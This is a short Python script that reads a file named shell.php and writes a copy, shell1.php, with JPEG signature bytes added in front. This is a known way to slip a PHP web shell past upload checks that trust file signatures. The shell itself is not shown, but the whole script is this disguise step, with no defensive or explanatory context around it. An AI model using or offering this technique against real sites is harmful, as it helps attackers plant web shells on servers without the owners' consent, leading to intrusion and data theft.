og = open('shell.php', 'rb')
ogb = og.read()
og.close()
print(ogb)

new = open('shell1.php', 'wb')
new.write(bytes.fromhex('FF D8 FF DB') + ogb)
new.close()
